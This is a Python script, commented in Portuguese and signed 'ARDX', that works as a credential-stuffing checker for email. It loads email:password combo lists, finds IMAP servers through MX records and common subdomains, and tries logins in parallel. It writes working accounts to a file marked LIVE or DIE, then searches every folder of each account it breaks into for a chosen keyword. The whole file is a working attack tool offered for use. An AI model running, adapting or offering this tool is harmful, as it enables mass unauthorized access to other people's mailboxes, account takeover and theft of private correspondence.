import argparse
import time
import gevent
from gevent import monkey
from gevent.pool import Pool
import dns.resolver
import logging
from imap_tools import MailBox, A
from typing import List, Tuple, Optional

# Arte ASCII
ascii_art = r"""
  ____  _            _   _           
 |  _ \| |          | | | |          
 | |_) | | ___  ___ | |_| |_ ____ __ 
 |  _ <| |/ _ \/ __| __| __/ _ \ '__| 
 | |_) | |  __/\__ \ |_| ||  __/ |   
 |____/|_|\___||___/\__|\__\___|_|   Super Mail Search 
                                      By: ARDX
"""

def print_ascii_art():
    """Imprime a arte ASCII e pede para pressionar Enter."""
    print(ascii_art)
    input("Pressione Enter para continuar...")

# Aplicar monkey patch para tornar o código compatível com gevent
monkey.patch_all()

# Configuração básica de logging para mostrar mensagens de erro e informações essenciais
logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

def detect_encoding(file_path: str) -> str:
    """Detecta a codificação do arquivo."""
    import chardet
    try:
        with open(file_path, 'rb') as f:
            raw_data = f.read()
            result = chardet.detect(raw_data)
            encoding = result['encoding']
            if encoding is None:
                encoding = 'utf-8'  # Codificação padrão se a detecção falhar
    except Exception:
        encoding = 'utf-8'  # Default para utf-8 em caso de erro
    return encoding

def read_credentials(file_path: str) -> List[Tuple[str, str]]:
    """Lê as credenciais de um arquivo."""
    credentials = []
    encoding = detect_encoding(file_path)
    try:
        with open(file_path, 'r', encoding=encoding) as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                parts = line.split(':', 1)
                if len(parts) == 2:
                    email, password = parts
                    credentials.append((email.strip(), password.strip()))
    except FileNotFoundError:
        pass  # Não mostra erro se o arquivo não for encontrado
    return credentials

def read_imap_servers(file_path: str) -> List[Tuple[str, int]]:
    """Lê servidores IMAP e suas portas de um arquivo."""
    servers = []
    encoding = detect_encoding(file_path)
    try:
        with open(file_path, 'r', encoding=encoding) as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                
                parts = line.split(':')
                if len(parts) < 2:
                    continue
                
                server = parts[0].strip()
                port_string = parts[1].strip()
                
                try:
                    ports = port_string.split(',')
                    for p in ports:
                        p = p.strip()
                        if p.isdigit():
                            port_number = int(p)
                            if port_number in {143, 993}:
                                servers.append((server, port_number))
                except ValueError:
                    continue
    except FileNotFoundError:
        pass  # Não mostra erro se o arquivo não for encontrado
    return servers

def discover_imap_servers(domain: str) -> List[Tuple[str, int]]:
    """Descobre servidores IMAP usando registros MX e subdomínios comuns."""
    servers = []
    try:
        # Descobrir servidores IMAP através de registros MX
        mx_records = dns.resolver.resolve(domain, 'MX')
        for r in mx_records:
            server = str(r.exchange).rstrip('.')
            servers.append((server, 993))  # Porta padrão para IMAP
            servers.append((server, 143))  # Porta padrão para IMAP
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
        pass  # Ignora erros ao buscar registros MX
    
    # Adicionar subdomínios comuns
    subdomains = [f'imap.{domain}', f'webmail.{domain}', f'mail.{domain}']
    for subdomain in subdomains:
        servers.append((subdomain, 993))
        servers.append((subdomain, 143))
    
    return servers

def try_connection(email: str, password: str, server: str, port: int, timeout: int = 60) -> Optional[MailBox]:
    """Tenta conectar a um servidor IMAP com as credenciais fornecidas."""
    try:
        mailbox = MailBox(server, port, timeout=timeout)
        mailbox.login(email, password)
        return mailbox
    except (ConnectionRefusedError, TimeoutError, OSError, Exception):
        return None

def search_criteria(mailbox: MailBox, criteria: str) -> Tuple[bool, List[str]]:
    """Busca por e-mails contendo o critério especificado em todas as pastas disponíveis."""
    found_messages = []
    try:
        # Listar todas as pastas disponíveis
        folders = mailbox.folder.list()
        for folder in folders:
            mailbox.folder.set(folder.name)  # Definir a pasta atual
            messages = mailbox.fetch(A(text=criteria))
            for msg in messages:
                found_messages.append((msg.uid, folder.name))
    except Exception:
        pass  # Ignora erros ao buscar e-mails
    return len(found_messages) > 0, found_messages

def process_email(email: str, password: str, criteria: str, logged_output_file: str, found_output_file: str):
    """Processa cada conta de e-mail tentando conexões com vários servidores IMAP e registra o resultado final."""
    if '@' not in email:
        return  # Ignora entradas mal formatadas
    
    domain = email.split('@')[1]
    servers_to_try = discover_imap_servers(domain)
    
    # Adicionar servidores da lista fixa
    servers_from_file = read_imap_servers('imap_servers.txt')
    servers_to_try.extend(servers_from_file)

    found_criteria = False
    logged = False
    found_messages = []

    for server, port in servers_to_try:
        mailbox = try_connection(email, password, server, port)
        if mailbox:
            logged = True
            with open(logged_output_file, 'a') as f:
                f.write(f'{email}:{password}:{server}:{port}\n')
            
            found_criteria, found_messages = search_criteria(mailbox, criteria)
            mailbox.logout()
            if found_criteria:
                with open(found_output_file, 'a') as f:
                    for uid, folder_name in found_messages:
                        f.write(f'{email}: LIVE {criteria} no e-mail UID: {uid} na pasta {folder_name}\n')
                break
            time.sleep(1)  # Esperar antes de tentar o próximo servidor
    
    with open(found_output_file, 'a') as f:
        if logged:
            if not found_criteria:
                f.write(f'{email}: LIVE\n')
        else:
            f.write(f'{email}: DIE\n')

if __name__ == "__main__":
    print_ascii_art()

    parser = argparse.ArgumentParser(description='Pesquisar e-mails para uma palavra-chave específica.')
    parser.add_argument('-i', '--credentials_file', required=True, help='Arquivo com e-mails e senhas')
    parser.add_argument('-o', '--logged_output_file', required=True, help='Arquivo de saída para emails logados')
    parser.add_argument('-g', '--found_output_file', required=True, help='Arquivo de saída para e-mails que encontraram a palavra-chave')
    parser.add_argument('-c', '--criteria', required=True, help='Palavra-chave a ser buscada')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Número de threads (tarefas concorrentes)')

    args = parser.parse_args()
    
    credentials = read_credentials(args.credentials_file)
    
    pool = Pool(args.threads)
    for email, password in credentials:
        pool.spawn(process_email, email, password, args.criteria, args.logged_output_file, args.found_output_file)
    pool.join()
